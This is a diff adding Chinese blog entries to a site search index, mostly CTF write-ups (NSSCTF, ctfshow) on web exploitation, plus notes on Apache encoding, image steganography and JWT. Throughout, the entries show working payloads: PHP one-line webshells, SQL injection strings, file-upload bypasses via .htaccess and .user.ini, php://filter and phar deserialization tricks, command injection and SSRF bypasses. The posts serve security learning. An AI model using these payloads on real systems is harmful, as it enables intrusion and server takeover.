@@ -4,6 +4,333 @@
   
     
     <entry>
+      <title>apache乱码问题</title>
+      <link href="/2022/01/22/apache-luan-ma-wen-ti/"/>
+      <url>/2022/01/22/apache-luan-ma-wen-ti/</url>
+      
+        <content type="html"><![CDATA[<h2 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h2><p>修改httpd.conf<br>查找：<br>AddDefaultCharset ISO-8859-1<br>改成：<br>#AddDefaultCharset ISO-8859-1<br>AddDefaultCharset off</p><p>这种方式关掉了服务器的默认语言的发送，这样仅凭html文件头中设置的语言来决定网页语言。</p><p>有人直接用</p><p>AddDefaultCharset GB2312</p><p>但是不建议这样做。</p><p>重新启动Apache,</p><h2 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h2><p>在中文网页请中依情况在标签中添加：<br>GB2312 (简体中文): (&lt;META http-equiv=”Content-Type” content=”text/html; charset=gb2312″ /&gt;)</p><p>BIG5(繁体中文): (&lt;META http-equiv=”Content-Type” content=”text/html; charset=big5″ /&gt;)</p><p>UTF-8: (注意是UTF-8，而不是UTF8) (&lt;META http-equiv=”Content-Type” content=”text/html; charset=utf-8″ /&gt;)</p><p>如果还是不正常，请清空浏览器的Cache试试。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> apache </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> apache乱码 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件查看器</title>
+      <link href="/2022/01/22/wen-jian-cha-kan-qi/"/>
+      <url>/2022/01/22/wen-jian-cha-kan-qi/</url>
+      
+        <content type="html"><![CDATA[<p>用dirsearch扫 发现<a href="http://www.zip下载源码/">www.zip下载源码</a> </p><p>开审</p><p>审一圈发现</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222637808.png" alt="image-20211206222637808"></p><p>这里触发phar反序列化</p><p>找链子最好的方法就是倒着找</p><p>先找危险函数</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222728642.png" alt="image-20211206222728642"></p><p>再找从哪能过来，访问了该类没有的属性即可以到这里</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222814988.png" alt="image-20211206222814988"></p><p>那怎么到__toString()呢</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206222854244.png" alt="image-20211206222854244"></p><p>但是到这里就卡住了 因为怎么来调这个check呢 那也只能从析构里面走啊</p><p>password怎么写呢</p><p>$a=new User();</p><p>password=array($a,’check’)</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206223043698.png" alt="image-20211206223043698"></p><p>链子构造好了，本地测试一下可以通，那么接下来就是怎么往里头写phar文件了我注意到有个log目录</p><p>这里要介绍 php://filter里面有个过滤器convert.base64-decode,他会把文件里面的非base64字符全都无视掉，所以我们想办法把除payload以外的东西全都控成非base64字符。</p><p>一.首先我们先使用过滤器的一些特性将log/error.txt的内容进行清空</p><p>php://filter/write=convert.iconv.utf-8.UCS-2|convert.quoted-printable-encode|convert.iconv.UCS-</p><p>2.utf-8|convert.base64-decode/resource=log/error.txt</p><p>二.将需要写入的payload编码  先base64编码再改成符合convert.quoted-printable的形式</p><pre class="line-numbers language-none"><code class="language-none">Python 3.9.0 (default, Nov 21 2020, 14:01:50)[Clang 12.0.0 (clang-1200.0.32.27)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import base64&gt;&gt;&gt; s = 'PD9waHAgX19IQUxUX0NPTV ... gAAAEdCTUI='&gt;&gt;&gt; ''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()'=50=00=44=00=39= ... 00=55=00=49=00=3D=00'&gt;&gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：这样改造convert.quoted-printable的形式多加了 “=00”；</p><p>三.</p><p>payload:</p><p>php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=log/error.txt</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211206224259456.png" alt="image-20211206224259456"></p><p>这样就可以写入任意文件了  因为过滤了utf16 所以我用UCS-2  注意有坑 </p><p>我第三步是</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230036756.png" alt="image-20211208230036756"></p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230053765.png" alt="image-20211208230053765"></p><p>生成的复制全部然后在前面还要加 “=00”；</p><p>总之这里许多坑 多调试就好了。</p><p>我们直接跑  phar://log/error.txt  啥都没发生</p><p>值得注意的是源码里面filter方法一旦匹配到phar就抛出异常从而导致程序非正常结束，然后就无法执行我们的pop链的第一个析构函数从而切断整个pop链。我们想到php的垃圾回收机制，在制作phar文件时传入一个数组让某个变量指向对象再让变量指向0 就能在抛出异常之前立马执行析构函数从而链子导通。</p><p>例如某数组的0键 值是我们要的对象 然后再把他的值变为0 这里就触发了强制垃圾回收</p><p>所以我们先<img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230757202.png" alt="image-20211208230757202"></p><p>下面是整个做法</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208230738536.png" alt="image-20211208230738536"></p><p>但是我们还需要去修改序列化后的值把1那个健改成0 </p><p>但是phar文件一旦生成后直接改内容是不行的，因为类似这种文件都会有一个校验值。</p><p>那我们直接更改肯定是一个不合法的phar，看到官方手册</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208231312891.png" alt="image-20211208231312891"></p><p>最后四个字节是GBMB</p><p>再倒数四个字节是签名算法</p><p>再往前20个字节就算签名内容</p><p><img src="/2022/01/22/wen-jian-cha-kan-qi/image-20211208231453721.png" alt="image-20211208231453721"></p><p>用来读取修改后的内容和生成签名</p><p>然后我们直接手改签名内容</p><p>重复上面写入步骤得到flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> NSSCTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> NSSCTF文件查看器 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>NSSCTF新生赛</title>
+      <link href="/2022/01/22/nssctf-xin-sheng-sai/"/>
+      <url>/2022/01/22/nssctf-xin-sheng-sai/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h2><p>简单的信息收集 按F12 crtl+f 搜flag</p><h2 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h2><p>直接上蚁剑连接 找到flag</p><h2 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h2><p>json是通过对字符串进行解码的一种格式</p><p>直接传参 json={“x”:”wllm”} post : id=wllmNB</p><h2 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h2><p>抓包 伪造http请求里面的user-agent为指定的浏览器</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/ebaabed4d9a399d06db59c3260a0d0cb.png" alt="image-20211007220917674"></p><p>访问响应出来的 a.php  它说只能通过本地访问 伪造http请求ip地址为本地</p><p>X-Forwarded-For:</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/c3dbf270430e2059851a61a147edcc10.png" alt="img"></p><p>访问./secretttt.php 得到flag</p><h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h2><p>md5弱比较  PHP在处理哈希字符串的时候，它把每一个以0e开头的哈希值都解析为0</p><p>在md5加密后以0E开头  </p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li></ul><p>md5强比较</p><p>PHP中md5()函数无法处理数组（会返回NULL）来实现绕过。</p><p>md5碰撞  不同字符串 MD5加密一样</p><p>任选其一可得flag</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>提示参数是wllm 随便输入报错 发现是sql注入</p><p>猜想要怎么样闭合语句</p><p>-1’order by 4 –+  测试有多少列</p><p>-1’ union select 1,database(),2 –+ 数据库名</p><p>-1’ union select  1,group_concat(table_name) from information_schema.tables where table_schema=”test_db”–+    表名</p><p>-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=”test_tb”–+ 得到列名   有id和flag（group_concat将得到结果组合在一起，不用的话只能得到一列名叫id）</p><p>-1’ union select  1,flag,2 from test_tb –+ 得到flag</p><h2 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h2><p>将一句话木马改成.png格式 抓包改回.php文件</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/91def65db7455d555660620df570ea88.png" alt="image-20211007222416744"></p><p>蚁剑连接获得flag</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/d29ab3bcb5b8a319d7de8fd13f7d3f0a.png" alt="image-20211007222516794"></p><p>假的  传入phpinfo();</p><p>查找nssctf关键字得到flag</p><h2 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h2><p>上传php文件是不行的  但我们还可以用.phtml</p><script language="php">@eval($_POST['a']);</script> GIF89a? <script language="php">eval($_REQUEST[shell])</script><p><img src="/2022/01/22/nssctf-xin-sheng-sai/2c30ca7a8e4edda6d2386a5882b68fd0.png" alt="image-20211007223010302"></p><p>然后上蚁剑连 查看flag.php 得到flag</p><h2 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h2><p>先 ?url=system(‘ls /‘) 查看根目录下有哪些文件</p><p>然后直接 ?url=system(‘cat /f*’);  得到flag</p><h2 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h2><p>根据题目意思设置cookie 值</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/84afcd42955816dbbc5a41f35b5e4500.png" alt="image-20211007223747659"></p><p>然后访问rasalghul.php 发现源码过滤了空格 通过%09进行绕过得到flag</p><p>?url=cat%09/f*</p><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>查看源码 发现</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5f0d8ee6a95317f8ebfef75da68b9b24.png" alt="img">  显然要访问robots.txt  得到/cl45s.php 获得题目源码</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/image-20211027145914927.png" alt="image-20211027145914927"></p><p>得到 序列化后的字符串 O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p><p>传?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;} 得到flag</p><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>提示传入一个file试一试 那就传入file参数 得到源码</p><p>使用伪协议得到加密flag  base64解密即可得到flag</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/6eb3ede8a4dffe536c47d6793b138452.png" alt="image-20211007225050149"></p><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><p>猜测是报错注入 </p><p>update构造注入语句：select name from user where id=1 and updatexml(1,concat(‘~’,(select database())),3);</p><p>解释：由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p><p>所以此题可以</p><p>id=1‘ and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_shcema.tables where table_name=database())),3);</p><p>由此获得表名 继而获得列名 得到flag 发现flag不全</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/f4dbc1302113455dd2a263828363d1fa.png" alt="image-20211007230329949"></p><p>获得剩下的flag</p><h2 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h2><p><img src="/2022/01/22/nssctf-xin-sheng-sai/image-20211027150153052.png" alt="image-20211027150153052"></p><p>获得序列化后的字符串</p><p>因为需要绕过魔术方法 wakeup 只需要将变量数目改成比原名数目大的即可;</p><p>O:6:“HaHaHa”:3:{s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:4:“wllm”;} 绕过wakeup 得到flag</p><h2 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h2><p>输入一个错误的url,让其报错,发现是apache,猜测是用.htaccess</p><p>什么是.htaccess?</p><p>.htaccess文件(分布式配置文件)提供了一种方式，使得配置文件可以随文件夹不同</p><p>而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。</p><p>如何利用.htaccess?</p><p>场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。</p><p>方法：</p><p>\1. 上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php .test】。</p><p>\2. 上传一句话木马文件，文件名设置为shell.test。</p><p>\3. 在浏览器中访问shell.test即可执行一句话木马。</p><p> 蚁剑链接shell.test 得到flag</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/3075aaf921f2ab97e0169998dec308f8.png" alt="image-20211007231334353"></p><h2 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h2><p>exec是没有回显的,可以写入文件获得回显</p><p>没有过虑|,可以使用tee进行写入文件,可以使用‘’来绕过过虑了命令</p><p>获得flag:?url=ca’’t /flllll’’aaaaaaggggggg|tee 1.txt</p><p>访问1.txt 得到flag</p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>发现魔术方法toString （当一个对象被当作字符串输出的时候，会自动触发）</p><p>构造pop链</p><p>因为类w44m中的成员变量是受保护的,要编码得到的序列化字符串才行</p><p><img src="/2022/01/22/nssctf-xin-sheng-sai/image-20211027150626274.png" alt="image-20211027150626274"></p><h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a><strong>PseudoProtocols</strong></h2><p>使用php://filter读取</p><p>?wllm=php://filter/convert.base64-encode/resource=hint.php</p><p>base64 解码得到<img src="/2022/01/22/nssctf-xin-sheng-sai/f3d1057db5755fb36cc835f6dd664a8b.png" alt="img"></p><p>访问 得到源码</p><p>使用data协议即可得到flag</p><p>?a=data://text/plain;base64,SSB3YW50IGZsYWc=</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> NSSCTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 新生赛 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>图片隐写</title>
+      <link href="/2022/01/22/tu-pian-yin-xie-zong-jie/"/>
+      <url>/2022/01/22/tu-pian-yin-xie-zong-jie/</url>
+      
+        <content type="html"><![CDATA[<h2 id="一-目前遇到的图片隐写术"><a href="#一-目前遇到的图片隐写术" class="headerlink" title="一.目前遇到的图片隐写术"></a>一.目前遇到的图片隐写术</h2><h2 id="1-附加式的图片隐写"><a href="#1-附加式的图片隐写" class="headerlink" title="1.附加式的图片隐写"></a>1.附加式的图片隐写</h2><p>直接附加字符串，由于计算机中图片处理程序识别到图片结束符就不再继续向下识别，因此后面的信息就被隐藏起来，这种方式可以直接notepad打开看到最后附加的字符。</p><p>图种是一种采用特殊方式将图片文件与rar文件结合起来的文件。该文件一般保存为jpg格式。可以用binwalk分析图片组成，也可以在010编辑器是否有zip或者rar等文件的文件头。</p><h2 id="2-基于文件结构的图片隐写（png）"><a href="#2-基于文件结构的图片隐写（png）" class="headerlink" title="2.基于文件结构的图片隐写（png）"></a>2.基于文件结构的图片隐写（png）</h2><p>1.文件头标志 89 50 4e 47 0d 0a 1a 0a 标志着png文件</p><p>接下来为IHDR数据块长度标志，后面跟着IHDR标识 49 48 44 52（ascii码为IHDR）再接下来就是IHDR块 先宽（4个字节）再高（4个字节）</p><p>如果图片原本是很高，但将图片高度变低，那么下面区域的信息就无法显示，可以用010编辑器修改高度复现。</p><p>2.IDAT 它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p><p>​    这种类型还没刷到。</p><h2 id="3-基于LSB原理的图片隐写"><a href="#3-基于LSB原理的图片隐写" class="headerlink" title="3.基于LSB原理的图片隐写"></a>3.基于LSB原理的图片隐写</h2><p>LSB,最低有效位。图像像素一般是由RGB三原色组成，每一种颜色占8位，即一共有256种颜色，一共包含了256的3次方的颜色，颜色太多，而人的肉眼能区分的只有其中一小部分，这导致了当我们修改RGB颜色分量中最低的二进制位的时候，我们的肉眼是区分不出来的。</p><p>用Stegsolve进行各种尝试获得（还不太熟练使用）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> misc </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 图片隐写 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件上传</title>
+      <link href="/2022/01/22/ctfshow-wen-jian-shang-chuan/"/>
+      <url>/2022/01/22/ctfshow-wen-jian-shang-chuan/</url>
+      
+        <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>1.前端校验</p><p>上传图片马，然后在burpsuie里把后缀png更改为php，再去执行命令即可，制作图片马方法</p><h2 id="2-htaccess-和-user-ini-配置文件妙用"><a href="#2-htaccess-和-user-ini-配置文件妙用" class="headerlink" title="2.htaccess 和.user.ini 配置文件妙用"></a>2.htaccess 和.user.ini 配置文件妙用</h2><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>在绕过文件上传的限制中，通常在 Apache 全局配置文件 httpd.conf 中有这样一条配置：</p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条配置的意思就是将.php、.phtml 文件后缀的文件当做 php 文件执行，如果开启了这条配置，就可以上传.phtml 文件在执行 php 代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php 文件后缀。</p><p>或者这条配置：</p><pre class="line-numbers language-none"><code class="language-none">SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将所有文件都解析为 php 文件。</p><p>通常全局文件我们都是不可更改的，而 Apache 还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的 web 目录起作用，例如：我们在 www 目录下有一个.htaccess 配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将 jpg 文件当做 PHP 文件解析。这样就可以直接解析 jpg 后缀的 webshell。</p><pre class="line-numbers language-none"><code class="language-none">// .htaccessAddType application/x-httpd-php.jpg// 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 1.jpg，当做 PHP 解析。</p><p>局限：.htaccess 配置文件只在 Apache 服务器中起作用。</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><pre class="line-numbers language-none"><code class="language-none">// .user.iniauto_prepend_file = 1.jpg// 1.jpg&lt;?php phpinfo();?&gt;// 1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是在一个目录下有.user.ini 这个配置文件，配置内容为上，有 1.jpg，同时该目录下还需要有.php 后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php 文件包含 1.jpg 这个图片，在此处相当于在 1.php 文件头插入了 <code>require('1.jpg')</code> 这条语句，也就是说相当于文件包含。<br>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。</p><p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。</p><p>局限：在.user.ini 中使用这条配置需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。</p><p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。</p><p>注意：传入的时候可能内容会被ban 需要各种过滤</p><pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=`tac ../f*`?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.<strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p><p> 可以加GIF89a图片头进行欺骗</p><p>也可以  1.png /b +2.php 3.png</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件包含</title>
+      <link href="/2022/01/22/ctfshow-wen-jian-bao-han/"/>
+      <url>/2022/01/22/ctfshow-wen-jian-bao-han/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>1.</p><pre class="line-numbers language-none"><code class="language-none">if(isset($_GET['file'])){    $file = $_GET['file'];    include($file);}else{    highlight_file(__FILE__);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p><p>2.代码中把php替换成了<code>???</code>，php伪协议大小写可以绕过，所以我们这里使用php://input伪协议，paylaod如下</p><pre class="line-numbers language-none"><code class="language-none">?file=Php://inputpost：&lt;?php system("tac flag.php");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>代码中把php替换成了<code>???</code>，php伪协议大小写可以绕过，所以我们这里使用php://input伪协议，paylaod如下</p><pre class="line-numbers language-none"><code class="language-none">?file=Php://inputpost：&lt;?php system("tac flag.php");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.日志包含</p><p>apache一般是/var/log/apache/access.log。：</p><p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log<br>当访问一个不存在的资源时，Apache日志同样会记录 例如访问<a href="http://127.0.0.1/">http://127.0.0.1/</a><!--?php phpinfo();?-->。Apache会记录请求“<!--?php phpinfo();?-->”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问<a href="http://127.0.0.1/">http://127.0.0.1/</a><!--?php phpinfo();?--> 就能生成包含一句话木马的access.log文件</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>jwt</title>
+      <link href="/2022/01/22/ctfshow-jwt/"/>
+      <url>/2022/01/22/ctfshow-jwt/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><p>jwt(JSON Web Token)是一串json格式的字符串,由服务端用加密算法对信息签名来保证其完整性和不可伪造.Token里可以包含所有必要信息,这样服务端就无需保存任何关于用户和会话的信息,可以用于身份认证、会话状态维持,信息交换。</p><p>jwt由三部分组成，header，payload与signature以点隔开，形如 aaa.bbb.ccc;</p><p>header用来声明token的类型和签名用的算法等，需要经过Base64Url编码。</p><p>payload用来表示真正的token信息，也需要经过Base64Url编码。JWT规定了7个官方字段</p><pre class="line-numbers language-none"><code class="language-none">，供选用iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还可以自定义一些需要的信息。</p><p>signature,将前俩部分用alg指定的算法加密，再经过base64url编码。</p><p>BASE64URL编码的流程：</p><pre><code>  1、明文使用BASE64进行加密 2、在BASE64的基础上进行一下的编码：          1)去除尾部的"="          2)把"+"替换成"-"          3)把"/"替换成"_"</code></pre><p>JWT的安全问题</p><p>1.允许修改算法为none。注意：<a href="http://jwt.io/%E4%B8%8D%E8%83%BD%E7%BC%96%E7%A0%81none%E7%9A%84">http://jwt.io/不能编码none的</a></p><p>2.信息泄露 密钥泄露。</p><p>3.爆破密钥。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> jwt </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ssrf</title>
+      <link href="/2022/01/22/ctfshow-ssrf/"/>
+      <url>/2022/01/22/ctfshow-ssrf/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><h2 id="351"><a href="#351" class="headerlink" title="351"></a>351</h2><!--?phperror_reporting(0);      highlight_file(__FILE__);$url=$_POST['url']; $ch=curl_init($url);                  //初始化cURL会话curl_setopt($ch, CURLOPT_HEADER, 0);   //启用时会将头文件的信息作为数据流输出curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //获取的信息以文件流的形式返回，而不是直接输出$result=curl_exec($ch);   //执行cURL会话curl_close($ch);echo ($result);?--><p>payload :   url=127.0.0.1/flag.php</p><h2 id="352"><a href="#352" class="headerlink" title="352"></a>352</h2><p><img src="/2022/01/22/ctfshow-ssrf/image-20211121155746538.png" alt="image-20211121155746538"></p><p><img src="/ctfshow-ssrf/5c75aa001957305ace15d4aaa22a482f.png" alt="image-20210908085752772"></p><p>payload:   url=<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><p>总结： 127.0.0.1的各种写法 </p><p><a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p><p><a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p><p><a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p><h2 id="352-353"><a href="#352-353" class="headerlink" title="352-353"></a>352-353</h2><p>同上通杀 127还可以用各种进制转化。</p><h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p>方法一:DNS-Rebinding攻击绕过</p><pre class="line-numbers language-none"><code class="language-none">url=http://r.kshbss.ceye.io.ceye.io/flag.php 自己去ceye.io注册绑定127.0.0.1然后记得前面加r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法二：访问vps搭建的 然后进行重定向到127.0.0.1</p><p><img src="/ctfshow-ssrf/image-20211121160352633.png" alt="image-20211121160352633"></p><h2 id="355-356"><a href="#355-356" class="headerlink" title="355-356"></a>355-356</h2><p>前面的127.0.0.1各种写法 通杀</p><h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><p><img src="/ctfshow-ssrf/image-20211121160755930.png" alt="image-20211121160755930"></p><p>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）<br>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）<br>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）<br>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p><p>我的vps不在保留ip和私有ip范围内，所以可以重定向绕过。</p><h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><p>要求以<a href="http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`">http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`</a></p><h2 id="359"><a href="#359" class="headerlink" title="359"></a>359</h2><p>打开是登录框，先随便输点什么，然后抓包<br>发现有个returl参数，并且可以随意更改url，这应该就是我们的利用点了</p><p>然后就是gopher协议打mysql,这里用到这个工具<a href="https://github.com/tarunkant/Gopherus">gopherus</a></p><p>python gopherus.py –exploit mysql</p><p>select “<!--?php @eval($_POST['cmd']);?-->“ into outfile ‘/var/www/html/2.php’;</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ssrf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ssti</title>
+      <link href="/2022/01/22/ctfshow-ssti/"/>
+      <url>/2022/01/22/ctfshow-ssti/</url>
+      
